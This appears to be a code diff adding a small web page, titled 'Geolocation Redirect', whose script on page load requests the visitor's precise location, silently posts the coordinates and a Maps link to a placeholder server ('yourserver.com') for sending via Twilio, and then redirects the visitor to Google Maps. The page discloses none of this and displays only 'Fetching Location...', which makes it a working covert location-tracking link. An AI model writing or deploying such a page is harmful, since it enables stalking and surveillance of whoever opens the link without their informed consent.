@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Redirect</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}&z=16`;
+
+                        // Send the location details via Twilio
+                        sendLocationToTwilio(latitude, longitude, googleMapsLink);
+
+                        // Redirect user to Google Maps
+                        window.location.href = googleMapsLink;
+                    },
+                    (error) => {
+                        console.error("Error getting location:", error);
+                        alert("Failed to retrieve location.");
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        });
+
+        function sendLocationToTwilio(lat, lng, mapsLink) {
+            fetch("https://yourserver.com/send-location", {  // Replace with your actual server URL
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lng,
+                    googleMapsLink: mapsLink
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log("Location sent successfully via Twilio!");
+                } else {
+                    console.error("Failed to send location:", data.error);
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</head>
+<body>
+    <h1>Fetching Location...</h1>
+</body>
+</html>
